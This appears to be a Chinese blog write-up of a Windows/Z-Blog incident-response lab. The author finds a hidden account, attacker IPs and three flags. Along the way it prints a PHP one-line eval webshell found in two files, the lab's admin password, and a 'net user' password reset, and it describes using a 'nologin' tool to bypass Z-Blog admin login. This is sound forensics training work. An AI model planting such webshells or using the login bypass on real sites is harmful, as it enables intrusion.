    <title>应急响应靶场3</title>
    <url>/2024/03/21/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA3/</url>
    <content><![CDATA[<blockquote>
<p>前景需要：小苕在省护值守中，在灵机一动情况下把设备停掉了，甲方问：为什么要停设备？小苕说：我第六感告诉我，这机器可能被黑了。</p>
<p>这是他的服务器，请你找出以下内容作为通关条件：</p>
<ol>
<li>攻击者的两个IP地址</li>
<li>隐藏用户名称</li>
<li>黑客遗留下的flag【3个】</li>
</ol>
<p>本虚拟机的考点不在隐藏用户以及ip地址，仔细找找把。</p>
<p>相关账户密码：</p>
<p>Windows:administrator&#x2F;xj@123456</p>
</blockquote>
<h1 id="隐藏用户名称"><a href="#隐藏用户名称" class="headerlink" title="隐藏用户名称"></a>隐藏用户名称</h1><p>做了好几遍了</p>
<p>win+r lusrmgr.msc</p>
<img src="/2024/03/21/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA3/image-20240321203606719.png" class title="image-20240321203606719">

<h3 id="hack6618"><a href="#hack6618" class="headerlink" title="hack6618"></a>hack6618</h3><h1 id="攻击者的两个IP地址"><a href="#攻击者的两个IP地址" class="headerlink" title="攻击者的两个IP地址"></a>攻击者的两个IP地址</h1><p>对网站根目录进行d盾扫描<img src="/2024/03/21/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA3/image-20240321203946523.png" class title="image-20240321203946523"></p>
<p>可以看到404.php</p>
<p>打开看看 发现是一一句话木马</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php eval($_POST[&quot;pass&quot;]); ?&gt; </span><br></pre></td></tr></table></figure>

<img src="/2024/03/21/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA3/image-20240321212355435.png" class title="image-20240321212355435">

<p>post-safe.php</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">eval($_POST[&quot;pass&quot;]);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<img src="/2024/03/21/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA3/image-20240321212504488.png" class title="image-20240321212504488">

<p>直接搜索flag 没有找到</p>
<p>搜索看看日志</p>
<img src="/2024/03/21/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA3/image-20240321212706954.png" class title="image-20240321212706954">

<h3 id="192-168-75-129"><a href="#192-168-75-129" class="headerlink" title="192.168.75.129"></a>192.168.75.129</h3><img src="/2024/03/21/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA3/image-20240321213120672.png" class title="image-20240321213120672">

<h3 id="192-168-75-130"><a href="#192-168-75-130" class="headerlink" title="192.168.75.130"></a>192.168.75.130</h3><h1 id="黑客遗留下的flag【3个】"><a href="#黑客遗留下的flag【3个】" class="headerlink" title="黑客遗留下的flag【3个】"></a>黑客遗留下的flag【3个】</h1><p>在黑客的下载文件夹中找到一个bat文件</p>
<p>里面有flag</p>
<h3 id="flag-888666abc"><a href="#flag-888666abc" class="headerlink" title="flag{888666abc}"></a>flag{888666abc}</h3><img src="/2024/03/21/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA3/image-20240324112123065.png" class title="image-20240324112123065">

<p>下面要更换hack6618$的密码</p>
<p>net user hack6618$ <a href="mailto:&#97;&#97;&#97;&#49;&#49;&#x31;&#x40;&#x71;&#x71;&#46;&#x63;&#111;&#x6d;">&#97;&#97;&#97;&#49;&#49;&#x31;&#x40;&#x71;&#x71;&#46;&#x63;&#111;&#x6d;</a><img src="/2024/03/21/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA3/image-20240324114110599.png" class title="image-20240324114110599"></p>
<p>打开任务计划程序<img src="/2024/03/21/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA3/image-20240324114150651.png" class title="image-20240324114150651"><img src="/2024/03/21/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA3/image-20240324113932782.png" class title="image-20240324113932782"></p>
<h3 id="flag-zgsfsys-sec"><a href="#flag-zgsfsys-sec" class="headerlink" title="flag{zgsfsys@sec}"></a>flag{zgsfsys@sec}</h3><p>打开网站</p>
<img src="/2024/03/21/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA3/image-20240324115000415.png" class title="image-20240324115000415">

<p>后台登录 用几个弱口令试了一下没成功<img src="/2024/03/21/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA3/image-20240324115849616.png" class title="image-20240324115849616"></p>
<p>直接上网搜了下z-blog免密码登录</p>
<p>然后就发现了nologin这个东西</p>
<p>下载解压后放在Zblog网站所在的根目录<img src="/2024/03/21/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA3/image-20240324120024566.png" class title="image-20240324120024566"></p>
<p>访问&#x2F;nologin.php</p>
<p>确实有点强<img src="/2024/03/21/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA3/image-20240324120052687.png" class title="image-20240324120052687"></p>
<p>在用户管理里面找到hacker 里面有flag<img src="/2024/03/21/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA3/image-20240324120206013.png" class title="image-20240324120206013"></p>
<h3 id="flag-H-Ck-sec"><a href="#flag-H-Ck-sec" class="headerlink" title="flag{H@Ck@sec}"></a>flag{H@Ck@sec}</h3>]]></content>
